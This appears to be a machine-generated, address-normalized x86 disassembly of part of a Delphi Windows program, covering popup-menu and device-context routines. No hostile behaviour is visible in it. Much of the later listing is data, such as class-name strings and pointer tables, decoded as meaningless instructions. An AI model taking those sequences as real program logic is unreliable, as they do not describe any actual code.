mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4259ec
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462dd2
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_425b4c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_44ba18
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ed68
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_461c54
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_461c54
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_461c54
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_461c84
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418cf8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_461c84
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_46ea0c
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_46ea74
jmp r-xdata
sub_462def
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_462ea8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_418b9c
pop esi
pop ebx
retn
push ebx
push sub_462918
call sub_422bc8
mov [ ebx + 0x10 ] eax
sub_462eec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_461a6c
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_462ea8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_462f60
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_462ed0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_461b08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_462fb8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_45de04
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_462774
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_462774
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_463000
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_45de04
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d5b8
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403518
mov edx eax
jmp r-xdata
sub_46304c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_417644
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_462fb8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4613c0
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4618bc
mov eax [ ebx + 0x34 ]
call sub_45ec64
mov eax ebx
call sub_462264
mov eax ebx
call sub_463000
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_45ed94
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_463100
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418cf8
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418cf8
cmp ebp [ eax ]
jne r-xdata
sub_46313c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4252cc
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_424b00
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_4252cc
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_424b00
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403518
mov edx [ r-xdata ]
call sub_4034a8
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4252cc
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_424b00
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_463224
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40416c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4043d8
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404678
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4043d8
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404678
jmp r-xdata
sub_4632b8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404118
mov ebx 0x1
mov eax esi
call sub_4043d8
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404300
sub_46331c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463375
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_463224
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_463224
mov eax [ ebp - 0x8 ]
pop edx
call sub_408248
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46337c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_463384
adc al [ eax ]
add [ eax ] al
or [ esi + 0x49 ] cl
add al dl
pop esp
dec ecx
add [ esi + ecx * 2 ] al
dec ecx
add [ esp + ebx * 2 + 0x49 ] bl
add [ eax ] al
dec esi
dec ecx
add al cl
pop ebx
dec ecx
add ah bh
dec ebp
dec ecx
add [ esp + ebx * 2 ] ah
dec ecx
add al bh
dec ebp
dec ecx
add [ eax + 0x4df40049 ] bl
dec ecx
add [ eax ] dh
pop esp
dec ecx
add al dh
dec ebp
dec ecx
add [ eax + 0x5e ] bh
dec ecx
add ah ch
dec ebp
dec ecx
add [ ebp + ebx * 2 + 0x4de80049 ] ch
dec ecx
add [ ecx + 0x49 ] dl
add ah ah
dec ebp
dec ecx
add [ eax + 0x61 ] dl
dec ecx
add al ah
dec ebp
dec ecx
add [ eax + 0x5d ] al
dec ecx
add ah bl
dec ebp
dec ecx
add al dh
pushad
dec ecx
add al bl
dec ebp
dec ecx
add [ eax + 0x4dd40049 ] ah
dec ecx
add ah al
popad
dec ecx
add al dl
dec ebp
dec ecx
add [ eax + 0x61 ] bh
dec ecx
add ah cl
dec ebp
dec ecx
add [ ebp + ebx * 2 + 0x49 ] dl
add al cl
dec ebp
dec ecx
add [ ebp + ebx * 2 + 0x49 ] ch
add ah al
dec ebp
dec ecx
add ah dl
pop ebp
dec ecx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46347c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463483
retn
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
call sub_40331c
mov eax [ rw-data ]
call sub_40331c
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
call sub_404118
sub_463488
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_463384
call sub_403e40
mov eax [ r-xdata ]
call sub_41832c
mov eax [ r-xdata ]
call sub_4183cc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418378
mov eax [ r-xdata ]
call sub_41823c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a6cc
mov [ rw-data ] eax
sub_4635b4
add [ eax ] al
inc esi
outsd
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
xchg edx eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add [ eax ] al
pop ecx
inc esi
add [ ecx ] dl
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
inc [ eax + 0x60 ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
loopne r-xdata
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax 0x80046
add bh bh
or [ eax ] al
add bh bh
clc
pop eax
inc esi
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
shl [ eax ] 0x36
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
[ ecx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
pushad
popad
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pushad
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
and al 0x60
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push 0x1a004010
add [ eax ] al
[ edx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
[ eax - 0x43ffb99f ]
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edi ] al
inc esi
add [ eax ] cl
ja r-xdata
outsd
insb
outsd
jb r-xdata
inc esi
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
and [ esi ] dh
jae r-xdata
inc edx
popad
jb r-xdata
jb r-xdata
xor eax 0x64f00046
inc ecx
add [ 0x6f460500 ] cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
dec esi
outsd
jb r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
pop eax
pushad
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ esi ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc esi
add [ eax ] cl
add [ eax ] al
jl r-xdata
xor eax 0x46
add ah cl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ eax ] al
je r-xdata
test ch bl
inc esp
add [ eax - 0x63ffbaf0 ] ch
out 0x44 al
add [ edx ] al
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
jmp [ eax + 0x61 ]
outsd
mov [ edi + 0x45 ] cl
add [ ebx + ebp * 2 ] ah
inc esi
add al bh
inc esi
add [ ebp + 0x45 ] dl
add [ eax + 0x3c004664 ] ch
and al [ ebp ]
mov eax 0xec004664
and eax 0x25f00045
inc ebp
add [ eax + 0x50004524 ] ch
and al 0x45
add al cl
push eax
inc ebp
add [ eax - 0x43ffbad2 ] bl
bound eax [ ebp ]
inc esp
dec ebp
inc ebp
add [ eax + edx * 2 ] dh
inc ebp
add [ eax ] bl
inc esi
add al cl
inc esi
add ah bh
imul eax [ esi ] 0x50006
adc al 0x1
adc eax 0xecb03c01
inc eax
inc [ eax ]
push 0x46
add ah bl
push 0x46
add [ eax ] al
imul eax [ esi ] 0xffffff94
imul eax [ esi ] 0xffffffd8
imul eax [ esi ] sub_466538
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add ah dh
arpl [ esi ] ax
loopne r-xdata
jae r-xdata
push esi
jb r-xdata
outsd
insb
nop
lodsb [ esi ]
cmp [ esi ] eax
pop es
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
enter 0x4661 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax ] cl
cmp [ esi ] al
add ecx [ esp + edx * 2 ]
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esp + 0x46 ] ch
rcr [ eax + 0x4638 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmp [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
cmp [ esi ] eax
xchg edx eax
cmp [ esi ] eax
sbb al 0x2
add [ eax ] al
mov ah 0xa8
inc esp
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
jb r-xdata
outsd
insb
cwde
cmp [ esi ] al
push 0xd0044ac
add [ 0x6d726f46 ] al
jae r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
cmp al [ esi ]
add edx [ eax ]
push esp
inc esi
outsd
jb r-xdata
jb r-xdata
je r-xdata
inc esi
add [ eax ] cl
add al [ eax ]
push [ eax + 0x1004666 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ esi + esi ] bl
inc esi
add [ ebx ] al
add [ eax ] al
add [ eax + 0x3b ] ch
inc esi
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
dec ebp
jae r-xdata
or [ ecx + 0x4f ] cl
insb
inc esi
je r-xdata
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + edi ] ah
inc esi
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
mov eax 0xf00463a
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x24000000 ] al
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x3b1c0040 ]
add bh bh
insd
and al 0x11
inc esi
add [ ebx ] al
lea eax [ eax ]
sbb al 0x3b
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
outsd
imul ecx [ edx + esi * 2 - 0x5afeffbf ] 0x1d
inc ebx
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
cmp al [ esi ]
push es
bound esi [ ebx + 0x4e ]
outsd
outsb
add eax 0x24000000
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ eax + 0xf00463a ] bh
jb r-xdata
jb r-xdata
inc edx
outsd
jb r-xdata
cmp al [ esi ]
add ecx [ esp + edx * 2 ]
jb r-xdata
inc esi
add [ edx + eax ] cl
add bh bh
shl [ esi + 0x46 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
or eax 0x74726556
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ ebx + edi + 0x46 ] ch
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
inc esi
insb
insb
inc edx
popad
jb r-xdata
push cs
jo r-xdata
mov eax eax
mov esp 0x600463b
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] bl
cmp eax [ esi ]
or [ esi + 0x73 ] ah
dec esi
outsd
jb r-xdata
push eax
outsd
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
insb
cmp al 0x46
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esp + edi + 0x46 ] ch
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
sar [ ebx + edi + 0xc060046 ] 0x54
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al dl
cmp eax [ esi ]
or dh [ eax + 0x6f ]
inc esp
jae r-xdata
push es
arpl [ ecx + 0x4e ] sp
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
jae r-xdata
cmp eax [ esi ]
nop
aam 0x3b
inc esi
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
push 0x9000463b
popad
dec ebp
je r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
jb r-xdata
jb r-xdata
inc esi
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
cmp al 0x46
inc eax
add [ ebp + edi + 0x46 ] dl
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
add [ ebx ] al
cmp al 0x46
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
popad
dec esi
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
or [ 0x63060046 ] bh
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
or al 0x3d
inc esi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
or al 0x54
inc esi
add [ esi ] al
jns r-xdata
add eax 0x6d726f46
